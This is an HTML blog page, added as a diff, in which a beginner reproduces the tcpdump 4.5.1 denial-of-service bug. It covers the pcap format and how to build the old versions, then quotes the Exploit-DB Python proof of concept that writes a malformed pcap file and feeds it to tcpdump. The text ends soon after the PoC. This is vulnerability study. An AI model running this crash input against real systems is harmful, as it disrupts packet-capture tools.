@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x0 前言新手开始学习二进制漏洞 选择这个开始学习，是因为这是一个网上有很多复现和分析文章的漏洞，即常见高频漏洞 分析文章：  https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;248394.html https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;166711 https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-261984.htm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tcpdump4.5.1拒绝服务漏洞复现分析">
+<meta property="og:url" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="0xkami-blog">
+<meta property="og:description" content="0x0 前言新手开始学习二进制漏洞 选择这个开始学习，是因为这是一个网上有很多复现和分析文章的漏洞，即常见高频漏洞 分析文章：  https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;248394.html https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;166711 https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-261984.htm">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163152207.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154436177.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154524975.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154822298.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154955786.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155033795.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155127829.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155342417.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155539098.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714160246743.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714161151520.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163355396.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163544925.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714164206440.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163905628.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714165900100.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714165918843.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170212005.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170252515.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170640606.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170801622.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714171537759.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714181754004.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714181831537.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714182139084.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170515455.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170602361.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715171350065.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715171624113.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170659670.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715180222023.png">
+<meta property="og:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715181224711.png">
+<meta property="article:published_time" content="2021-07-16T05:29:36.000Z">
+<meta property="article:modified_time" content="2021-07-16T05:31:49.957Z">
+<meta property="article:author" content="0xkami">
+<meta property="article:tag" content="tcpdump">
+<meta property="article:tag" content="gdb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163152207.png">
+
+<link rel="canonical" href="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>tcpdump4.5.1拒绝服务漏洞复现分析 | 0xkami-blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">0xkami-blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">void</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/0xkami" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="0xkami">
+      <meta itemprop="description" content="If you want me,satisfy me">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xkami-blog">
+    </span>
+      <header class="post-header" style="background-color: rgba(255,255,255,0.8);padding: 15px 0px;border-radius: 10px;margin-bottom: 60px">
+        <h1 class="post-title" itemprop="name headline">
+          tcpdump4.5.1拒绝服务漏洞复现分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-07-16 13:29:36 / 修改时间：13:31:49" itemprop="dateCreated datePublished" datetime="2021-07-16T13:29:36+08:00">2021-07-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">二进制漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody" style="background-color: rgba(255,255,255,0.8);padding: 15px; border-radius: 10px;">
+
+      
+        <h4 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h4><p>新手开始学习二进制漏洞</p>
+<p>选择这个开始学习，是因为这是一个网上有很多复现和分析文章的漏洞，即常见高频漏洞</p>
+<p>分析文章：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/248394.html">https://www.freebuf.com/vuls/248394.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/166711">https://www.anquanke.com/post/id/166711</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261984.htm">https://bbs.pediy.com/thread-261984.htm</a></p>
+</blockquote>
+<a id="more"></a>
+
+<h5 id="0x01-前置知识："><a href="#0x01-前置知识：" class="headerlink" title="0x01 前置知识："></a>0x01 前置知识：</h5><h6 id="pcap包格式"><a href="#pcap包格式" class="headerlink" title="pcap包格式"></a>pcap包格式</h6><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.winpcap.org/docs/docs_412/html/incs_2pcap_8h_source.html">https://www.winpcap.org/docs/docs_412/html/incs_2pcap_8h_source.html</a></p>
+</blockquote>
+<p>pcap文件主要包含了三个部分，24字节的pcap文件头，16字节的数据包头，数据包内容。</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163152207.png" alt="image-20210714163152207"></p>
+<h4 id="0x1-环境搭建"><a href="#0x1-环境搭建" class="headerlink" title="0x1 环境搭建"></a>0x1 环境搭建</h4><p>系统：kali 2021.2</p>
+<h5 id="0x11-tcpdump安装"><a href="#0x11-tcpdump安装" class="headerlink" title="0x11 tcpdump安装"></a>0x11 tcpdump安装</h5><p>当前版本查看：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154436177.png" alt="image-20210714154436177"></p>
+<p>卸载：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get --purge remove tcpdump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154524975.png" alt="image-20210714154524975"></p>
+<h6 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a><strong>安装依赖</strong></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install flex</span><br><span class="line">apt install bison</span><br></pre></td></tr></table></figure>
+
+<h6 id="安装libpcap"><a href="#安装libpcap" class="headerlink" title="安装libpcap"></a><strong>安装libpcap</strong></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.5.3.tar.gz </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154822298.png" alt="image-20210714154822298"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf libpcap-1.5.3.tar.gz</span><br><span class="line">cd libpcap-1.5.3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154955786.png" alt="image-20210714154955786"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155033795.png" alt="image-20210714155033795"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp; make install</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155127829.png" alt="image-20210714155127829"></p>
+<h6 id="安装tcpdump"><a href="#安装tcpdump" class="headerlink" title="安装tcpdump"></a><strong>安装tcpdump</strong></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;tcpdump-4.5.1.tar.gz</span><br><span class="line">tar -zxvf tcpdump-4.5.1.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155342417.png" alt="image-20210714155342417"></p>
+<p>接下来同上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd tcpdump-4.5.1</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make &amp; make install</span><br></pre></td></tr></table></figure>
+
+<p>装完之后查看版本：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155539098.png" alt="image-20210714155539098"></p>
+<h5 id="0x12-poc"><a href="#0x12-poc" class="headerlink" title="0x12 poc"></a>0x12 poc</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39875">https://www.exploit-db.com/exploits/39875</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: tcpdump 4.5.1 Access Violation Crash</span><br><span class="line"># Date: 31st May 2016</span><br><span class="line"># Exploit Author: David Silveiro</span><br><span class="line"># Vendor Homepage: http:&#x2F;&#x2F;www.tcpdump.org</span><br><span class="line"># Software Link: http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;tcpdump-4.5.1.tar.gz</span><br><span class="line"># Version: 4.5.1</span><br><span class="line"># Tested on: Ubuntu 14 LTS</span><br><span class="line"></span><br><span class="line">from subprocess import call</span><br><span class="line">from shlex import split</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def crash():</span><br><span class="line"></span><br><span class="line">    command &#x3D; &#39;tcpdump -r crash&#39;</span><br><span class="line">    buffer     &#x3D;   &#39;\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\xf5\xff&#39;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x00\x00\x00I\x00\x00\x00\xe6\x00\x00\x00\x00\x80\x00&#39;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00&lt;\x9c7@\xff\x00&#39;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x06\xa0r\x7f\x00\x00\x01\x7f\x00\x00\xec\x00\x01\xe0\x1a&#39;</span><br><span class="line">    buffer     +&#x3D;  &quot;\x00\x17g+++++++\x85\xc9\x03\x00\x00\x00\x10\xa0&amp;\x80\x18\&#39;&quot;</span><br><span class="line">    buffer     +&#x3D;  &quot;xfe$\x00\x01\x00\x00@\x0c\x04\x02\x08\n&#39;, &#39;\x00\x00\x00\x00&quot;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x00\x00\x00\x00\x01\x03\x03\x04&#39;</span><br><span class="line">    with open(&#39;crash&#39;, &#39;w+b&#39;) as file:</span><br><span class="line">        file.write(buffer)</span><br><span class="line">    try:</span><br><span class="line">        call(split(command))</span><br><span class="line">        print(&quot;Exploit successful!             &quot;)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;Error: Something has gone wrong!&quot;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;Author:   David Silveiro                           &quot;)</span><br><span class="line">    print(&quot;   tcpdump version 4.5.1 Access Violation Crash    &quot;)</span><br><span class="line">    sleep(2)</span><br><span class="line">    crash()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过运行这个poc，我们可以获得一个crash文件</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714160246743.png" alt="image-20210714160246743"></p>
